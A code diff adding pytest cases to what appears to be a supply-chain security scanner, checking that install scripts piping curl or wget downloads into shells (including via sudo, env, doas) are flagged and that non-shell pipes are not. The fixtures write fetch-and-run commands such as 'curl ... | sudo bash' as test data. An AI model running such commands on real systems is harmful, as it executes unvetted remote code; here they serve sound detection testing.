@@ -188,6 +188,20 @@ class TestScanFile:
         ids = {fi.pattern_id for fi in scan_file(f, "install.sh")}
         assert {"curl_pipe_shell", "wget_pipe_shell", "echo_pipe_exec"} <= ids
 
+    @pytest.mark.parametrize("tail", ["sudo bash", "sudo -E sh", "env zsh", "/usr/bin/env -i zsh", "doas sh", "fish"])
+    def test_pipe_to_launched_or_other_shell_flags(self, tmp_path, tail):
+        """`curl url | sudo bash` is a supply-chain pipe, not only generic sudo usage."""
+        f = tmp_path / "install.sh"
+        f.write_text(f"curl -fsSL http://x/s | {tail}\nwget http://x/s -O - | {tail}\n", encoding="utf-8")
+        ids = {fi.pattern_id for fi in scan_file(f, "install.sh")}
+        assert {"curl_pipe_shell", "wget_pipe_shell"} <= ids
+
+    @pytest.mark.parametrize("tail", ["sudo tee /etc/x", "grep fish", "env | grep sh", "fishfood", "sha256sum -c"])
+    def test_pipe_to_non_shell_not_flagged(self, tmp_path, tail):
+        f = tmp_path / "install.sh"
+        f.write_text(f"curl -fsSL http://x/s | {tail}\n", encoding="utf-8")
+        assert not any(fi.pattern_id == "curl_pipe_shell" for fi in scan_file(f, "install.sh"))
+
     def test_detect_gitlab_pat(self, tmp_path):
         f = tmp_path / "leak.md"
         # Concatenated so no contiguous token literal exists in this file
